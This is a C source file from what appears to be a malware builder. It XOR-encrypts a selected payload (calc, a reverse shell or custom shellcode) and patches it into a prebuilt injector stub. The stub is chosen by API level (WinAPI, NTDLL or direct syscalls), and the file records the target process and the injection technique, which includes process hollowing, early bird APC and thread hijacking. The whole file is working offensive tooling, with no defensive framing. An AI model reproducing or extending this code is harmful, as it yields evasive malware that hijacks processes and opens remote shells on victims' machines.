#include "generator.h"
#include "payloads/payloads.h"
#include <stdio.h>
#include <stdlib.h>

#define PAYLOAD_MARKER 0xDEADBEEF

BYTE GetTechniqueIndex(InjectionTechnique technique) {
    switch (technique) {
    case INJECTION_CREATE_REMOTE_THREAD: return 0;
    case INJECTION_EARLY_BIRD_APC: return 1;
    case INJECTION_THREAD_HIJACKING: return 2;
    case INJECTION_PROCESS_HOLLOWING: return 3;
    case INJECTION_REMOTE_MAPPING: return 4;
    default: return 0;
    }
}

BOOL GetStubPath(const MalgenConfig* config, CHAR* stub_path) {
    const CHAR* api_name;
    CHAR exe_dir[MAX_PATH];
    CHAR* last_slash;

    switch (config->api_level) {
    case API_WINAPI:
        api_name = "winapi";
        break;
    case API_NTDLL:
        api_name = "ntdll";
        break;
    case API_SYSCALLS:
        api_name = "syscalls";
        break;
    default:
        api_name = "winapi";
        break;
    }

    GetModuleFileNameA(NULL, exe_dir, MAX_PATH);
    last_slash = strrchr(exe_dir, '\\');
    if (last_slash) {
        *(last_slash + 1) = '\0';
    }

    sprintf_s(stub_path, MAX_PATH_LEN, "%s..\\..\\src\\stubs\\stub_%s.exe", exe_dir, api_name);
    return TRUE;
}

BOOL PatchBinary(const MalgenConfig* config, LPVOID payload, SIZE_T payload_size) {
    HANDLE hStub, hOutput;
    DWORD stub_size, bytes_read, bytes_written;
    LPBYTE stub_data;
    DWORD i, marker_offset = 0;
    DWORD marker = PAYLOAD_MARKER;
    BOOL found = FALSE;
    CHAR stub_path[MAX_PATH_LEN];

    GetStubPath(config, stub_path);

    hStub = CreateFileA(stub_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hStub == INVALID_HANDLE_VALUE) {
        printf("cant find stub: %s\n", stub_path);
        printf("build stubs first\n");
        return FALSE;
    }

    stub_size = GetFileSize(hStub, NULL);
    stub_data = (LPBYTE)malloc(stub_size + payload_size);
    if (!stub_data) {
        CloseHandle(hStub);
        return FALSE;
    }

    if (!ReadFile(hStub, stub_data, stub_size, &bytes_read, NULL)) {
        printf("couldnt read stub\n");
        free(stub_data);
        CloseHandle(hStub);
        return FALSE;
    }
    CloseHandle(hStub);

    for (i = 0; i < stub_size - sizeof(DWORD) - 12; i++) {
        if (*(DWORD*)(stub_data + i) == marker) {
            BOOL looks_like_struct = TRUE;
            DWORD j;
            for (j = sizeof(DWORD); j < sizeof(DWORD) + 12; j++) {
                if (stub_data[i + j] != 0) {
                    looks_like_struct = FALSE;
                    break;
                }
            }
            if (looks_like_struct) {
                marker_offset = i;
                found = TRUE;
                break;
            }
        }
    }

    if (!found) {
        printf("marker not found in stub\n");
        free(stub_data);
        return FALSE;
    }

    printf("found marker at offset: 0x%X\n", marker_offset);
    printf("struct offsets: payload_size=0, payload=%zu, xor_key=%zu, technique=%zu, target=%zu\n",
           sizeof(DWORD),
           sizeof(DWORD) + MAX_PAYLOAD_SIZE,
           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1,
           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2);

    printf("\nbefore patching - bytes at marker:\n");
    printf("  [0-3] payload_size: %02X %02X %02X %02X (0x%08X)\n",
           stub_data[marker_offset], stub_data[marker_offset+1],
           stub_data[marker_offset+2], stub_data[marker_offset+3],
           *(DWORD*)(stub_data + marker_offset));
    printf("  [%d] xor_key: %02X\n",
           sizeof(DWORD) + MAX_PAYLOAD_SIZE,
           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE]);
    printf("  [%d] technique: %02X\n",
           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1,
           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1]);

    printf("\npatching:\n");
    printf("  payload_size: %zu bytes (0x%08X)\n", payload_size, (DWORD)payload_size);
    printf("  xor_key: 0x%02X (encryption: %s)\n",
           (config->encryption == ENCRYPTION_XOR) ? config->xor_key : 0x00,
           (config->encryption == ENCRYPTION_NONE) ? "none" : (config->encryption == ENCRYPTION_XOR) ? "xor" : "aes");
    printf("  technique: %d\n", GetTechniqueIndex(config->injection));
    printf("  target: %s\n", config->target.process_name);

    *(DWORD*)(stub_data + marker_offset) = (DWORD)payload_size;
    memcpy(stub_data + marker_offset + sizeof(DWORD), payload, payload_size);
    *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE) = (config->encryption == ENCRYPTION_XOR) ? config->xor_key : 0x00;
    *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1) = GetTechniqueIndex(config->injection);

    memcpy(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2,
           config->target.process_name, strlen(config->target.process_name) + 1);

    printf("\nafter patching:\n");
    printf("  [0-3] payload_size: %02X %02X %02X %02X (0x%08X = %u)\n",
           stub_data[marker_offset], stub_data[marker_offset+1],
           stub_data[marker_offset+2], stub_data[marker_offset+3],
           *(DWORD*)(stub_data + marker_offset),
           *(DWORD*)(stub_data + marker_offset));
    printf("  [4-7] first 4 payload bytes: %02X %02X %02X %02X\n",
           stub_data[marker_offset+4], stub_data[marker_offset+5],
           stub_data[marker_offset+6], stub_data[marker_offset+7]);
    printf("  [%d] xor_key: %02X\n",
           sizeof(DWORD) + MAX_PAYLOAD_SIZE,
           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE]);
    printf("  [%d] technique: %02X\n",
           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1,
           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1]);
    printf("  [%d] target (first 12 chars): %.12s\n",
           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2,
           stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2);

    hOutput = CreateFileA(config->output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hOutput == INVALID_HANDLE_VALUE) {
        printf("couldnt create output file\n");
        free(stub_data);
        return FALSE;
    }

    if (!WriteFile(hOutput, stub_data, stub_size, &bytes_written, NULL)) {
        printf("couldnt write output\n");
        CloseHandle(hOutput);
        free(stub_data);
        return FALSE;
    }

    printf("wrote %lu bytes\n", bytes_written);

    if (!FlushFileBuffers(hOutput)) {
        printf("warning: couldnt flush buffers\n");
    }

    CloseHandle(hOutput);

    printf("verifying written file...\n");
    {
        HANDLE hVerify;
        LPBYTE verify_data;
        DWORD verify_read;

        hVerify = CreateFileA(config->output_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hVerify != INVALID_HANDLE_VALUE) {
            verify_data = (LPBYTE)malloc(stub_size);
            if (ReadFile(hVerify, verify_data, stub_size, &verify_read, NULL)) {
                printf("read back %lu bytes\n", verify_read);
                printf("  [0-3] at marker offset: %02X %02X %02X %02X (should be 69 00 00 00)\n",
                       verify_data[marker_offset], verify_data[marker_offset+1],
                       verify_data[marker_offset+2], verify_data[marker_offset+3]);
            }
            free(verify_data);
            CloseHandle(hVerify);
        }
    }

    free(stub_data);

    return TRUE;
}

VOID PrintConfigSummary(const MalgenConfig* config) {
    printf("config:\n");

    printf("\tpayload: ");
    switch (config->payload_type) {
    case PAYLOAD_CALC: printf("calc.exe\n"); break;
    case PAYLOAD_REVERSE_SHELL: printf("reverse shell\n"); break;
    case PAYLOAD_CUSTOM_SHELLCODE: printf("custom shellcode\n"); break;
    }

    printf("\tencryption: ");
    switch (config->encryption) {
    case ENCRYPTION_NONE: printf("none\n"); break;
    case ENCRYPTION_XOR: printf("XOR (key: 0x%02X)\n", config->xor_key); break;
    case ENCRYPTION_AES: printf("AES-256\n"); break;
    }

    printf("\tinjection: ");
    switch (config->injection) {
    case INJECTION_CREATE_REMOTE_THREAD: printf("CreateRemoteThread\n"); break;
    case INJECTION_EARLY_BIRD_APC: printf("early bird APC\n"); break;
    case INJECTION_THREAD_HIJACKING: printf("thread hijacking\n"); break;
    case INJECTION_PROCESS_HOLLOWING: printf("process hollowing\n"); break;
    case INJECTION_REMOTE_MAPPING: printf("remote mapping\n"); break;
    }

    printf("\tAPI: ");
    switch (config->api_level) {
    case API_WINAPI: printf("WinAPI\n"); break;
    case API_NTDLL: printf("NTDLL\n"); break;
    case API_SYSCALLS: printf("syscalls\n"); break;
    }

    printf("\ttarget: %s\n", config->target.process_name);
}

BOOL GenerateMalware(const MalgenConfig* config) {
    LPVOID payload;
    SIZE_T payload_size;

    PrintConfigSummary(config);

    printf("\ngetting payload\n");
    if (!GetPayload(config->payload_type, &payload, &payload_size)) {
        printf("couldnt get payload\n");
        return FALSE;
    }

    printf("payload size: %zu bytes\n", payload_size);

    if (config->encryption == ENCRYPTION_XOR) {
        SIZE_T i;
        printf("encrypting with XOR...\n");
        for (i = 0; i < payload_size; i++) {
            ((BYTE*)payload)[i] ^= config->xor_key;
        }
        printf("encrypted\n");
    }

    printf("patching stub\n");
    if (!PatchBinary(config, payload, payload_size)) {
        free(payload);
        return FALSE;
    }

    free(payload);
    printf("done: %s\n", config->output_path);
    return TRUE;
}
